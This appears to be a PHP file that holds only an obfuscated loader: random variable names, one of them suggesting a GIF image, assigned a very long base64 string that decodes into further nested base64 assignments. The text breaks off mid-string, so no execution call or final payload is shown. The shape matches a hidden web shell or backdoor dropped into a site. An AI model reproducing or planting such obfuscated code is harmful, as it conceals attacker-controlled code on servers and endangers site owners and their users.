<?php $Hgif = ' $OMvG = 'ICR3ZHVsID0gJ0lDUkZaR1ptSUQwZ0owbERVbmxXYTA0eVNVUXdaMG93YkVSVmEwcFdVbGRvVTFOVlVYZGFNRzkzWWtWb2FWTkdXbTlXYlhCelRteGtjMkZHU21sTlIzZ3dWbGMxUTJGck1IZFRibkJZVm0xb2VsZHRlSGRYVms1MVlrZHNUazFJUVRKVk1XUnpUVEZ2ZDAxV1VtaGxiVkpMVldwR2RtVkdiSFJOVlRsT1VqQmFXVlF4YUZkVGJFbzJWbGhvV21FeVRURlphMlJPWld4V2RHRkhSbE5sYlhjeFZqSjRiMUl3TVZoU2JHeFZZbXRLWVZSWE1UUk5iR3gwWWtjMWFFMVhlRnBWTWpBeFZFWlZkMU5VVGxSV1YyaE1XV3RrVTFOV1duVmlSMnhvVmxWYU1sVjZRazlWTWtaSVZHNVNXazF0VWxKV2ExSkRZbXhPV0dORlNtaFdXRkpWV1Zock5WTnRSbkpTYmtKVlRXMTRkVmxWVmpCU1JsWjBZVWR3YVZZd05UTlZla1pTVGtkR1YxVnVUbGRoZWtaV1ZWUkNjazFzVGxoaVIzQm9WbGhvZDFaWE1XOWhiVXBZVkdwR1ZGWXllSEZaVmxVMVRsWkdjV0pGY0ZKTlJWcDFWa1ZvYzJSc2IzaFRXR3hYWW14YWFGWXdWbmRpTVdSeVdYcFNZVTFYZERWVU1XaFhVMnhKZVZWdVRscGlWRVpZV2xaYWMxZEdWblZYYlhCb1ZsVndSRll5ZEc5VU1ERllVMnhTVWxaNmJHRmFWbVF3VFZaT1ZsUnJUbE5OYkVwWlZHeGtkMkZHY0ZSak0xcHJZa2ROZDFSdGRITlNiVlpKVjJ4d1YwMVZiM3BYVkVsM1RsZEdjMk5HYUZaaWEwcHdWbXBLTkdNeGJIUk9WazVyWVRKNFIxWlhNVFJoYXpGeVRsUldXbFp0YUVSWlZ6RkhWMFU1V1Zac1FtaFdWWEJFVmpGU1MxUXlTa2hVV0d4VFZqSlNhRlpxVG10aWJGcFlUVlprYVdKVldscFdSM0JEWVcxS1ZXRkhOVnBXYlUxNFdWUktSMWRHVW5SaFIwWlRaVzFvZFZZeWRHdFdiRzk1VTJ0b1UxWXlVbkpWYWtKaFkwWnNjbHBGV21GTlZscEpWVzAxYzFkc1dqWlNiazVoVWxkb1RGcEhNVTlPYlVsNVdrVjBVMDF1YUROWFZ6QXhWVEpTZEZWcmFGZGlia0p5VldwQ1lXTldiSEZUYkU1cVVtMDVOVlF3Wkd0VmF6RnlWMnBDV2sxSFRUQlhha3BQVTBaS2RXSkhkRk5OVmxwMVZqSjBhMVpzYjNsVGEyaFRWakpTY0ZWcVRtOWlNWEJJVFZaYVlVMXJOVXBWTWpWRFlWWlpkMWRxVmxwV2JWSkhWMnBHVjJSR1duRlJiV3hPVFVoQmVGZFhOWGRrYkc5NFYydGtWR0pHY0ZSV1ZFSkdUbFpPVmxkcmRHbFNiVGsxV1d0b2QyRXhUa1pqUkVwVVZsZG9VRnBITVV0VFIwcElZMGRvV0ZKcmNIWldNblJxVGtadmVGTnVTbE5oZWtaWFZGVmFWMkpzVmtkVWEwNVRZbFUxTVZVeU5XRmhiVVpXVTI1S1dHSkZOVVJaVmxwelYxWlNkR1ZGY0ZOTlZYQjZWVEZXYTFVeVJraFZhMmhRVjBoQ1MxVnVjRzlpYkdSeVdrWmFZVTFYZERWVU1XaFhXVlpaZDA1WVJscFdNVlo1VkVST1lWZEZOVWhhUmtwWVVteHNNMWRYY0U5VGF6VnlZa1ZhVTJFeFdsZFVWbHBoVkRGT1ZsWnRSbWxTYlhRMVdWVmtiMVZIUmxaU2FsSlZUVVV4TkZaSGVITlhWazUwWTBkb1VtVnJTVEZXUmxaVFVXc3hWbUpGV2s1WFJuQm9WV3BLTkdSR2JGZGFSVGxvVW0xME5WbHROV0ZOYXpVMlVtcEdWRlpYWjNwWGFrWkxaRVphZEdOSGFGTk5SbHAxVjIxMFQxRXhSblJWYkd4V1lteHdjVmxXVmtkbFJsSkpZa1ZLWVUxWVFqRldiVFZYVjJzd2VGTnVaRnBoYTJ0M1YycEtTMU5GT1ZoaFIwWlVVbGhDZWxZeFVrcE9WMVpYWTBWb1YySnVRbkpWYWtKaFkyeHNjVlJyZEdsU01EVmFWbTAxUTJGck1YUmxTRVphVm0xTk1WcEdWakJTUmxaMVVXMW9WMlZzV25wWFdIQlBWVEpXVjJOR2JGTmlXRUp3VkZkNFMyUXhaSEZUVkZKcVRVaENTVlJzVWtkVmF6RnhZa1JHV21KWGVIbFhha3BYVGxaR1dGcEhSbE5OVm5Bd1YxWmFhazFYU2taa1JWSlVZbGhvV2xSWGN6Rk5iR3gwVFVSR2FWSnRkRFpXVnpWRFlWVXhjVlZ1UWxWU1ZURXpXbFZXTUZaWFRYbGFSMFpUVFZad01GZFdXbXBOVjBwR1pFVlNWR0pZYUZwVVYzaExZMFpPV0dKRVRtdFNWRVozV1Zod2ExTnNTWGhUYms1WVlsUkdlbHBHV25kV1JtOTVZa2RHVjJGdGVIcFhWM2h2VVRBeFNGWnNVbFJYUlRWT1ZtdFZlR1F4VVhwaVJVNW9UVmhDV1ZZeU5VTmhWMHBYVm01YVZGWjZSbEJaYTJSUFpFVTVTR0pGTVZOU1ZWb3pWa1JPYzFGc2IzbFNiR2hZVmpKU1RWVlVSa3ROVm5CSFZtczVhMkpWY0RCVWEyaERVMnhPU1ZSdE5WUmhNbWhRV1ZaYVZtVnNTblZVYTNCVFVrVktkVlV4WkRSVU1VcHpWV3RhVjJFeFNsaFZWRUpIWlVaT1ZsWnRSbFpOVmtZelZGVmthMWxXWkVaT1NHUllWbTFTVkZwSE1VOWtSbHAxWVVkMFYwMXVaekpYVmxwclZESk9TRk5ZYkU5U01sSllWRlZrYjFJeFdsaGtSbHBoVFZoQ1dsWkhjRU5oYlVwWFYycFNXRlpGYXpGWlZFcEhWMFp3U1ZkcmNGTlNSVXAxVlRGV1QxTnRVbFppU0VKYVRXMTRUbGxXV2t0a01XeFhXWHBHYVZJd01UWldWelZ6V1Zaa1JsZHVSbHBoYTNCVVdUQmFkbVZWT1VsV2EzQm9WakExZDFaRVRuTlJiRzkzWTBWb1QxWkZXbGRaYkZwaFRteHdSMXBFVWs1U1YzaEdWRlZrYTJGc1NYbFZiVEZZWWtkb2RsbHJXbk5PVm05NVpFZHNhV0pHY0VaWFYzQktUVmRTVm1WRlVsWmlia0poV1d0Vk1VNUdiSEpVYmtwUFRVZDRSVlZYY0VkaFYwcHlUbGhPWVZKVk5YVlpWRXBPWlZaT2MxVnRjRmROTWxJelZrUk9jMUV5VGtkalNFSlNWbnBzVEZWdWNGWmxSbHBZVFZaa2JHSldTbGxhVlZKRFZFWlZkMU5VVGxSV1ZUVlVXa1prVTFac1VuUmhSMnhwWWtWd1ZWZFhjRTloYkc5NFVXeFNVbUp0VW1oVVZsSnpUVlp3UjFremFHeFdNR3cyVjJ0b2QxUkdSWGhUYWtaaFVteHdURmxyWkU1bGJGcDFWRzEwVWsxdVRYcFZNVlpQVVRKT1IyTklRbEpXZW14TVZXNXdWbVZHVmxWVGEyUnJWakZLU0ZVeU5XRmhNbFpXVWxoS1ZGWlhVbEJaYTJSUFpFVTVTVkZyY0ZSVFJUVjFWVEZXVDFVeVVsaFZiRnBWWWxkb2NGbHRlRXRUUm14WFdrWmthazFZUWtwV1JtUnJWVlpWZDFOcVRsaGhhMVV4V2taa1UxZEZNVmhOVjJoWFRWWndObFl5ZEc5VWJVbDNZMFZvVDFaRldsZFpiRnBoVG14d1IxcEVVazVTV0ZKV1dYcEthMU14VGtaT1dFSlhWbnBCTVZSVVFuTlNWVEZJV2tkd1UwMXNTblJXTWpCNFZqQXhSMkV6YkdoU01YQnhXV3hTY21Wc1RsWlViVFZvVFd0d01WWnRlRTlaVm1SR1RraG9XbUV5YUZOWmVrWnlaVlphZFdKSGJHeFdNMDE2VlRGV1QxVXlWbk5pU0Vwc1UwVktjVlJVUmt0aU1VNVdWVmhrWVUxWGVGcFZNalZ6VjJ4a1NHUklXbFJXVlRWTVdXdGtUbVZzVm5WaVIwWllVbFp3ZUZkWGNFdFZNazVIWWpOc1VGSXllRkpXYTFKVFkyeHNObE5yZEZaTmEydzJWMnRrUzFSc1NuRlJibkJVVmxVMVRGbHJaRTVsYkZaMVlrZEdXRkpXYjNoWFYzQktaVWRHV0ZSdVVsZFdNbmhTVm10U1UyTnNiRFpUYTNSV1RXdHNObGRyWkV0VWJGcHhVVzV3VkZaVk5VeFphMlJPWld4V2RXSkhSbGhTVm5CNVZqSjRiMVF5Um5SVWJsSm9UVzE0VWxaclVsTmpiR3cyVTJ0MFZrMXJiRFpYYTJSTFZHMUtSVkZ1Y0ZSV1ZUVk1WRlZrUjFkV1JuUmxSM0JPVFZWd2VGZFhjRXRWTWs1SFlqTnNVRkl5ZUZKV2ExSlRZMnhzTmxOcmRGWk5hMncyVjJ0a1MxUnJNVlZSYlRWVVRWWktObGRxU2s5a1JscHhVVzEwV0ZKWVFYaFZNVlpQVlRKV2MySklTbXhUUlVweFZGUkdTMkl4VVhwaVJVNVFWbGQ0U1ZadE5VOWhhekZ6Vm0wMVlWZEhlRU5YYWtwUFpFWmFjVkZ0ZEZoU1dFRjRWVEZXVDFFeVNrZGFNMnhYWW14S2NWVXdXa3BOVmxGNllrVktZVTFzY0ZWVlYzQnpVMnhKZUZkdWNGcGxhM0JYVjJwS1YwNVdSblZpUjBaWVVtdHNORmRVU1hkTlJtOTNZa1ZvVjJKV2NHaFZha0p5VFRGT1Zsb3paR0ZOYkhCVlZWY3hOR0ZXVGtaT1dFNVVWbGRvTmxkcVNrOWtSbHB4VVcxMFdGSllRWGhWTVZaUFVUSktSMW96YkZWaWJIQndXV3hTVjJNeFpGVlViRTVxVWpCc05WUnJVbXRUYkU1RlVXMDFZV0pGTlVOWGFrSTBUbGRKZVZwR1RrNWlSbTk0VmpKNGIxTXlSa2RqUldoUVVqSlNZVlJYY0hOTlZrNVdXa2QwYVZJd2NEQldiVFZ6VjJ4WmVGTnFTbHBOYlhoRVZWZDRkMU5XVW5GU2JXeFdUVVZhTWxZeGFITmpiVkpXWWtWU1VtRXlVbkpXYm5CWFkxWnNXRlpZU2sxTk1YQlpWR3RTWVZOc1NYaGlNMmhhWVRKUk1GcFhlSEpsVmtwMVZtMXdWRkpZUVhsV01WSkxWakpGZVZKc2FFNVhSVXBvVm01d1ZtUXhiSFZpUlU1VFZtNUNXbFpITVhkaGJVcFlaVVJPV0ZaRmNIcGFSekZMWTFkSmVWcEdTbGROUkZaNFZqSjRiMVF5UmtaaVJXeFdZbXh3YUZWdWNITk9iRTVXV2tSU2EySlZOREZWVjNoUFdWWlplVlZ1WkZwbGF6VlVXbFprU21Wc1VsaGFSWEJUVFZWd2VsVXhWbXRPUjBaR1lrVnNWbUpYYUdGWmJHaHZZakZPVmxkclRtaFNNRFV3VlcwMVUxbFdaRWRUYWxaYVlXczFUMVJ0ZEhOU01VNTBaVWQwVTJWdGR6RlhWekIzVGtVMWNtSkZaRlppUlRWWVZteGFWMkpzVmtkVWEwNVVZa2hDUlZWWE1UQlpWbFYzVTFoa1drMXFSa2hhUm1ST1pWWktkR05HY0U1aVdHZDVWMWN4YzFFeFNYaFNiRnBzVW14S1ZGWlVRa1pPVms1V1ZteGtiRll3TlRCVU1XaHpVMnhKZUZOdVRsUldWMUpNV1ZWa1RtVldXbGhhUjBaVFRWWmFkVll5ZEd0U01ERklVMWh3VlZZeVVuQmFWbFpMWTJ4a2MxUnJUbWhpVld3MVZHeGtORmRyTVhKT1dHUlBaVzFPZVZReFpFdGpSa1p5VTIxMFdGSnJiM2xYVkVwM1pHeHZlRkpzV2xaaVJrcFlWbXhTUTJKc1ZuUk5WbVJvWWxWYVNWVnNVbUZUYkVwR1ZsUkNWVkpzVmpSWlZXUlBaRVpTZEU5Vk1WZFNWM2Q2VmtaV1UxWnNiM2hWYkdoUVZqTlNiMVpxUm5ka01XUlZVMnRrYUdKVlduTlRNMnMxVFd4YU5sVnROV0ZoTURWRVZXcEdkMWRHVW5SUFZuQldUVVZyTUZVeFZsZFNNREZZVld0b1VGZEhlRXRWVkVrMVRXeE9WbFJyVG1sV01VcFpWR3hrZDJFeFNYbGxSRXBhWWxkNFJGbHNaRk5YUjFaSlZHMXdUbUY2Vm5aWFZ6QjRWakpXZEZWcmFGTmlXRkp3VkZSQ2QyTXhhM2hoUm1ScVVqQXhOVmxyWkhkaFJsbzJZa1JHVkUxRk5WUmFSbVJUVm14U2RWZHRiR2xXUmtvelZURldiMlZzYjNkaVJXaFdZbGhvYUZsc1pEUk5WbVJ6VkcwMWFGWnVRbGhVTVdSM1lWVXhjVlpxUmxoaVIxSlFWRlZrUjFkRk9WbFdhM0JvVjBkUmQxWkdXazlqYXpSM1lrVm9WbUpZYUdoWmJHUTBUVlprYzFSdE5XaFdia0pZVkRGa01GZHRSbFppU0hCVlVteEtTMWt3VlRWT1ZrWjBaRWRHVjAxWVFqTlhWekI0Vm0xSmQySklVbGRpVm5Cb1ZtNXdSMDB4Y0VaaFNFcG9WbGhvUlZSVmFIZFVSbHBKVkcwMVdHRXlVbGhaYkdSSFYwVTFXR1ZGZUZKTlNFSjRWako0YjFNeVVuSmlTRUpyVFRKU1RWWnJhRTlpYkU1V1draE9hVlpYZUVWWGFrb3dZVmRLYzFkclZscGhhMnQ0V2taV01GWkdSbkZhUlhCU1RWVnZNbFl4WkRSVU1sWklVMnRTVWxaSGVFdFZWRUozVmxaV2MxWnFVbE5pUlZZMFZsWmthMVJIUmxaVGEyaFhWak5OTVZaSGRITlRSbHAxWTBkMFUwMUdjSGxYVjNCUFV6SktTRlJzYkZkaWEwcHhWRmN4TkdOV2JGZFplbFpyVmxkNFNWUXhhSE5aVmtsNFYycFdWRlpYVWt4VWJGWnpVMFphZFdOSGRGUlNXRUo2VjFSR2ExUXlVbk5qUldocFVucFdjRnBXVm5KTk1VNVdWR3RLYUUxcmNERldiWGhQV1Zaa1JrNUlhRnBoTW1oVFYycEdRMVpHUm5WYVIwWk9Wa2Q0ZWxkc1ZtdFdNa1p5WkVWU1ZtSnNXbkpXYkZVeFRXeHNkRTFFUW1wTlNFSktWa2N4YzFack1IZFhibkJVVFZaS05sZHFTa2RYUm1SWVdrVjRVazFWYjNoWGExcGhVekpLU0ZSWWNGZGlhelZ5VlZSS01HSnNjRmxpUlVwb1RXdHdNVlp0ZEZOWGJGbzJWbGhrVjFaNlFURlVWRUp6VWxVeFNGcEhjRk5OYkVwMFYxY3dNVll5VWtoVWJsSlFWa1UxY1ZwV1pHdGpiR3gwVGxaa1ZrMVlRbHBXUjNCSFlWWk9SMUp1WkZWTk1uaERWMnBLVTFkRk5WbGpSMFpZVW10YU1sVXlkRzlVTWtaWFZsaHdVMkpyTlUxV2EyaFBZbXhzVjFwR2NHRk5TRkpGVmxjMVYyRXhXbFpPVnpsYVlsUldWRlpVU2twbGJHdDVXa1pHYUZaVmNIaFdNbmh2VXpKU2NtUkdVbEpoYlZKTFZWUkNTMDVXWkhOaFJrNU9WakExTUZSclpHdFRNVW8yVmxob1YxWjZSbGhhVnpGVFYwZFdSVkZzUW14V1ZXc3hWVEZXYTFZeVRYbFVXR3hYVmpKU2MxcFdWa2RpYkd0NVRWWmtUbEl4U2xwVk1qVlhVMnhGZDFOdVRsaFNSWEJZV2tWa1QxTldWbkZXYkVKc1ZsVmFkVmR0ZUU5Uk1EbFdZa1ZvVjJKck5YRlVWM2hYWW14d1dXSkZUbXhXYmtKYVZsZHdSMkZ0U2xWVmJUVlVWbGRTV0ZkdGVIZFRSazVWV2tWd1ZGSkZTblZYYlhoUFVUSktTRk5yYkZWaVdHaExWVEJvVDJKc2EzbE5WbVJPVWpGS1dsVXlOVmRUYkVWM1UyNU9XRkpGY0ZCYVJ6RkxaRVUxV0dWR2NFNU5WWEF6VjFkd1NrMUZOSGRpUld4T1VqSlNkRlpVUWtkaWJGSkpZa2hhWVUxVmJEVldiVFZYV1Zaa1JtTkhPVmhoTWswd1YycEdjbVZWT1ZsV2EzQlRUV3hLZWxkWE1IaFdNbFpYWWtab1ZtSnNjSEZaVmxaTFVURmtjbUZGT1U1V01IQlZWVlpqTlZkdFZsaGtSRVpVVmxVMVJGVnFTbE5YUlRWWVkwZG9ZVlV6VGpKYVIzaHFUVVUxY21KRlpGVmlhMHB3V1cxNFMySXhjRlphU0U1c1lsVTFTbFV5TldGWGF6RnpWMjVLV2xadFRqUlpNRnAzVjBVMVZWRnRiR3hXVlhCSFZqSjRiMVF5Um5SVWJsSnBVMGRTWVZSWE1UUk5iR3gwWTBoYVlVMVdjREJXYlRWellVWlplR05JWkZoV1JYQkhWMnBLVG1WWFNrbFdiWFJUVFVacmQxZFdXbTlVYkc5NFkwVm9WMVl5VW5CVmFrSlhZbXhrVlZOVVZtdFdNREUyVm0wMVQyRXhTWGRXYlRWWVlrZE5kMWRxUm5kVFIwcEpWbXh3VjJWcldqTldNVkpIVkRKR2MySkdhRTlTTWxKWFZXcENZVTVXWkZkWk0yaHBVakZLU2xVeU5XRmhiVlowVDFjMVZHRXlVa2hhVmxwM1RsWkdjMXBHY0ZkTk1tZDVWMVJLYzFFeVJYaGpSbWhyVFcxU1lWUlhkR0ZOUm10M1dYcFNZVTFJUWtsV1J6RnZZVlprUmxOcVNsUldWbFY0V2tjeFMxZEdUblZpUjBaV1RVVndlVll5ZUd0Tk1XOTRZVE5zVTJKc1NuRlZibkJ2WW14T2NscEhSbXBOVjNoWlYydG9hMkZ0U2xWaVNFWllZa2RTVkZrd1pFdFhSMHBJWlVkc2FXSkZiM2xWTVZaWFV6SkdTRk51VWxaaVdHaHhXV3hXVjJKc2EzaGhSbVJwVWxkNFNWWlhNVFJaVjBwWVpVUkdXR0pGTlVSYVZ6RkhWa1pHZFdOSFJsWk5SV3cwVjJ0V2EyTXlUWGxTYkd4cVVqSm9TMVZzVm1GVlJsWnlWR3RPVmsxWVFscFdWelZoWVcxS1ZWWnFTbFZOYlhoRVZteGFWMk14V25KWGEzQlRVa1ZLZFZaWE1UQlNNVkpYVmxoa1YxWXlVbEpXVkVKTFVURndSMkZHVG10aVZUVjRXV3BLYTFkc1pFWmpTR1JZVm0xb1VGbFhNVXBsYkZKWVdrWk9hVlpzY0hoWFZsWnJVbXMxY21KRlZsTldSa3BPVm14U1IySXhhM2xOVlRscFRVaG9WbFV4YUd0VWJFcEhWbTAxVjFKdFRURlpWRXBIVjBaa2RWRnNjRTVoTVhCNFYxWmtWbU5yZDNwWGJHaFBVakpTZEZWVVFrdFRSbVJ6V2tVNWFVMVhlRlZWVjNCdlUyeEtWbGRZYUdGU1YwMHhXbFpXYzFKSFNYcFhhM0JTVFVWd01GZHJXbXBOVjBaMFZXdG9hVk5HY0hCWlZsWkxUbXhzVjFsNlJrNVNiWGhhV1ZWb1EyRnJNWE5YYWxwaFVsZFNTRmxVU2twbGJFNTBaVWR3V0ZKc2NETlhXSEJMWXpKR2RGSnNhRkJYUmxwTlZWUkdTMkl4YTNsTlYzQnFUVWQ0UlZaWE1YZFhiRm8yVW1wT1dtSnRkM3BYYWtKM1kwWldkRTFYYkZOTlJuQXhWako0YjFRd01VaFVXR3hUWW1zMVRWWlVRa3BOTVU1V1draE9hVlpYZUVWWGFrb3dXVmRLV1dGSE9WaGhhM0JZV2xjeFUxTldVblJoUjJ4U1RXNVNkVlV5ZEd0U01ERllWbXRTVWxaSGVFdFZWRUozVVRGYVNHUkdTbWhXVkdzeFZWWmthMkZHV1hoaVJ6VlVUVVUxVkZsVlpFOWtSbXcyWWtaR1ZrMUhlSGRWZWtaUFVUSldWMk5HYkZaaGExcHhXV3hTVTJKc1RsaGlSWEJQVFVkNFNWWnROVTloYXpGelZtMDFZVmRIZUVOWlZFWjNaRWRXU0dGSFJrNWlSbTh5VjJ0V2IxUXlSa2hUYTFKU1ZrZDRTMVZyVmxaTk1VNVdXa2hPYVZaWVVrbFdiVFZ6V1ZaWmVWUnVXbFJoYTNCUVdrZDRkMU5IUlhsT1ZURlNUVVZhZVZZeFVrdFNNbEpJVkd0b1VGTkZTa3RWTUdodVRrWk9WbFJzVG1oaVIzaFpWRlpvYTJGWFZsWlNWRlpXVW1zMVExbHRNVk5YUlRWWlVXeHdUbUZ0ZDNkWGExWnJZekpSZVZOcVZscE5iVkowVlRCb2EySnNaSE5oUlhScFVtNUJNVmRxU1RGaFYwcHpWMnBDV0dKSGFFeGFSM1IzVGxkUmVWcEZkRk5OUkZaMlYxZDRiMUV5VW5Ka1JsSm9UVzFTY1Zsc1dscGtNWEJIWVVWMGExWlhlRVZXVnpGdllURmtTRnBFUmxSV01uaERXVlpXTkdOR1ZuUmpSbkJYWld0WmVsZFhOWEpOUjBaV1lrVldUbEl5VWt4YVZsWnpUVlpzTmxSc1RteFdNVXBKVkRGU1IyRnNUa1pUYms1YVRXMTRkVmxVUm5OWFZrNTBUbFY0Vm1Wc1NuZFZNalZ6VTJzMGQySkZhRmRpYXpWeFZGZDRWMkpzYTNsTlZtUk9VakZLV2xVeU5WZFRiRVY0VTIwNVlWSnRhSFZhUmxaelkwWkdjVkp0Y0ZSU1ZYQjZWMVJLYzJKdFJsWmxTRUpXWWxoQ1lWWnVjRWROTVd4MVlYcENhRlpZVWxWVlZ6VlBZVVpaZWxWdVRsUldWVFZ4V1d0V2MyTkZOVmxqUjNSVVVsYzVNMWRYY0U5V01sRjVWR3RvVjJKdGVFMVZWRVpMWWpGcmVVMVhjR3BTV0doM1ZURmtORk15VmxaaGVrNVVWbGRrTTFkcVNtRldSa1pZV2tVeGJGWjZiSFZXVjNCTFZqSlNWMk5HYkZSaVYyaG9WVzV3YjJKc1pGVlRWRlpyVmxkNFNWZHJaRFJoVjBwWFYycFdXRlp0VWxSYVJ6RlBZMFpHY2xOdFJsUlNWRkkwVjFkNFQxRnRTWGhpUkZab1RURmFTMVZVUWt0VFJuQkhXWHBHYUdKVlduTlRNMnMxVFd4YU5sVlVTbFJXVmxwVVdUQmtTMlJHU25WVmJXaFhUVVJXVmxZeFVrdFNNbEpZVkd0c1ZHSnNjR0ZVVjNoaFkyeHNWMWt6YUdwU2JrSlpWR3hTUTJGWFZsWlRhMXBZWWtkb1VGbFhNVTlrUjBwSldrWndUbUpZWjNsWFZ6RjNaR3h2ZUZKc2FGVmlXRUpvVmpCVk1XSXhUbFphUm1ScVRVZDRTbFV5TVRSWlZURjBaVVJhWVZKWGFFeGFSM1J6VTFaS2NWSnRSbFpOUlhBeVZqRmFhMVF5U2taaVJXaE9WakpvY2xWcVFURmtiRTVXV2tVNWEySlZjSGRWVnpWUFYyeFZkMU51VGxwaVZGWlVXbFphYzFkR1ZuUmhSWEJUWVRCd2RsZFVTWGhTTWxKSFkwWnNWbUp0ZUhCVVZFRjNUV3hPVmxSc1RtcFNNRnBaVkd4U1EyRlZNSGhUYms1YVpXczFWRmxWV25KbFZUbFlaRWRvVjAxc1NYbFZNVlpYVkRKR1NGTnNiRkppYkhCTFZUQldTMkl4YTNsT1ZrNXBVbGQ0U1ZaWE1UUlRiRWw2WVVjNVZGWlhVVEJaZWtaelYxWmtkR1ZGY0ZSU1ZXOHhWMVphYW1WSFJraFVibEpwVWpKb1MxVnRkSGRqTVhCR1dYcFdiRll3Y0RCVU1GSmhVMnhLYzFOc1VsZGlSbHBYVjJwR1ExWkdSbkpqUjBaU1pXeEtkVll5ZEd0V2JHOTVWV3RzVkdKWGFIQlpiWE14WWpGa1ZWTnJPV3BTTUd3MVZHdG9WMU5zU2xkalJVNVhVbFp3VUZWdGRITlNWVEZJV2taT1dGSllRVEZYVjNCUFUyeHZlR05GYUZkV01sSmhXV3hXWVU1c1pITlVhMDVvVFZoQ1ZWVlhNVEJYYkdSSFUycEtXazB5ZUVSYVIzUnpVMFpXZEdWRmNGTk5SRlY1VjFjd2VGWXlSbk5oTTJ4cFlteHZlVlJ1Y0VkTlZrNVdWbXRrVGxZeFNrbFVNV2h6VlVkR1ZsTnRPVnBOYWtaNldWVmtUbVZXVW5WWGJYQnNWbFZ3U1ZZeWVHdFVNa2w0WWtaV2FVMXRVazlXYTJSclRVWmFSMXBGWkd4V2JYUTFWMnBPVTFSdFJuSlNhazVWWWtVMVJGWkhNVXBsVmxaMVVXMUdhVll6YUhoV01WcHJWREpPUlZsNlRreGxiWGh3V1ZaV1NrNUdUbFpXYlVacFVtMTBOVmxWWkc5VGJFNUpXa2MxVmxadGFGaFVWV1JLWld4T1dGcEZlR2hXUjJoMVZURldhMWxWTVZoVGJsSlZZV3RLYjFadWNITk5WazVXV2taT2FsSXdjREJWYlRWVFlVWlpkMDVVV2xoV1JYQklXa1phZDFkV1VuRlJiSEJYVFZWdmVWZFVTWGhXTWxaSVZXeG9hVk5JUW05V2FrRXhaREZzY1ZOVVFtbE5SM2hGVmxjMVEyRnRTbFpPVmxKWVlrZFNVRnBITVU5a1JsWlpWR3QwVTJWc1ZqUldWbEpLVGxkU1dGTnVRbEpYUlVwTFZUQm9UMkpzWkhKYVJtUnBWakJhV1ZSc1pEUlVSa1YzWTBoT1dGSkZjRkJhUnpGTFpFVTFXR1ZHY0U1TlZYQXpWMWR3U2sxSFJsWmxSVkpPVTBkb1RWWnJhRTlpYkdSeVdrWmthVll3V2xsVWJHUTBWRVpGZDJOSVRsaFNSWEJVV1ZaV2MyTkhVWHBWYXpWb1ZqTk5lbFV4Vm10Vk1rcEhZMGhTYVZOR1dtaFdWRXByWTBaa2MxZFVWbWxTTUhCYVZWZHdRMkpHVlhkaVNIQlZVbXhLVDFrd1ZUVk9Wa1owWkVkR1YwMVlRak5YVnpCNFZtMUpkMkpJVWxWaVdHaHhXV3hTYjJOR1VrWlZhMHBxVWxSck1WVldaREJaVjBwWllVYzVXR0ZyY0ZoYVZ6RlRVMFpLZEdSSGJFNU5TRUo2VjFSR2IxWXlUa2hVV0d4cFVqTkNiMVp1Y0hOTlZrNVdWVmhrWVUxWGREVldiVFZ6WVZkV2RWUnROVlJXVjFKNldXeFdjMUpHYjNsa1IyeHBZa1p3UmxkWGNFcE5WMUpXWkVaU1VtRnRVa3RWVkVKSFkyeHNObE5yZEZkU01EVlpXa1JLYTFWV1ZYZFNia0pYVmtWS1dGWkdXa3RXYkZKelZtdHdVazFxYkhWV1Z6RTBVekZXUjFWc1VsSmlXR2h4VkZSR1MySXhaSEpaZWxac1ZtNUNXbFZ0Y0VkaFJtUkdUbGhrV0ZaRmNIcGFSekZMWTBaR2MyRkdVbE5XYkhCVlZsZDRUMU50VWxaaVJXeFZZbXRLY0ZsdGVFdGlNWEJXV2toT2JHSklRbHBXUjNCRFYyeFplRk5xU2xwTmFrWllXbFZrVTFkSFNrbGpSMmhYVFVSV00xZFhjRXBOUjBsM1kwVm9hVk5IZUdGVVZsWjNZekZrVlZOVVZteFdia0pJV2tWa05HRnJNSGhUYWxaWVlrZG9TRmxYTVVwbFZsWjFVVzFHVG1GdGVISldSVlpQVXpKS1NGUlljRlppYlhob1ZqQldZV05XYkhGVGJFNXFVbTA1TlZRd1pITlVWa1Y0VTI1U1dtRXlVa2haYlhoM1YxWlNjVkZzY0ZkTlZXOTVWMVJKZUZZeVZraFZiR2hwVTBoQ2IxWnFRVEZrTVd4eFUxUkNhbEpZYUhkVlZ6VjNZVVphTmxaWVpGaFdiV2gyV1RCa1RtVldXblZqUjNSVFRVWndlVmRYY0U5VE1rcElWR3hzVjJKclNuRlVWekUwWTFac1YxbDZWbXRXV0ZKRlZsYzFRMkZ0U2xaT1ZsSllZa2RTVUZwSE1VOWtSbFowVTIxR1dGSlVVak5YVkVsNFZqSldTRk51VWxCWFJrcGhXVzEwZDJNeFpFZFVhazVvVm01Q1dsWkhjRU5oYlVwWFYycFNXbUpVUVRGYVJWcHpaRlpPZEdWRmNHaFhSMUo1VmpJd2VFNUhSa2RpTTJ4WFltNUNjbFZxUW1GamJHeHhWR3QwYVZJd05WcFdiVFZEWVdzeGRHVklSbHBXYlUweFdrWldNRlpGTlVoYVIzQk9ZbGhuZUZkclZtdFNNRFZJVW14c1ZXSllhSEZVVkVaTFlqRmtjbGw2Vm14V2JrSmFWVzF3UjJGR1pFWk9XR1JZVmtWd2VscEhNVXRqUm05NVpFZG9XRkpZUW5oV2JHTjRWakpHZEZOWWNGUmlXRkpaVkZkNFlVNXNjRVpoUlhScFVqQTFXVlpYTVRSaGF6RnlUbFJXV2xac2JETlpla0p6WkVaYWRXTkhkRlJTV0VKNlYxUkdhMVV5U2toVVdHeFZZbTE0YjFaVVFuTmxiRTV5V2tkR2FrMVhlRmxYYTJRMFlXc3dlRk50T1ZoaE1rMHhXbFphZDFkV1NuRlNiV2hZVWxSV00xWXhVa3RqTWxKMFUyNUNhRTB4V2t0Vk1GVXhaREZzZEU1V1RtaFNNVnBKV1d0b2QxbFdaRVpPU0dSWVZtMVNWRnBITVU5a1JscDFZVWQwVjAxdVp6SlhWbHByVkRKT1NGTlliRTlTZW14TVZXcEtORTVXWkZWU2EzUnBVbTEwTlZReGFITlpWa3AxVlZoa1dsWnRhRVJaYTJST1pXeFdkR05IYkU1aVJYQXpWakp3U2s1V2NFWmxSVkpVWVd0S2IxWXdWa3RqTVd3MlZHeE9hR0pWYkRWV1Z6VkRXVlV4Y1dGSVFsVlNWVFZVV1d4a1MxTkdTblJPVjBaWVVsUlNNMVl4V210Vk1sSjBWRzVTVjJKdGFISldha28wVG14c1YxcEZPV3BTTUd3MVZHdG9RMVZIVmxaU2JUVlVZVEpOZUZSV1dsZGtSbHAxWTBkMFYwMHlaRE5WTVZaU1pERnZlRkpyYkZKaVZGWmFWRmQ0V2sxR1pITmFSVFZwVFVoQ1NWUnNVa2RWYXpGeFlrUkdXbUpYZDNwWlZFcE9aV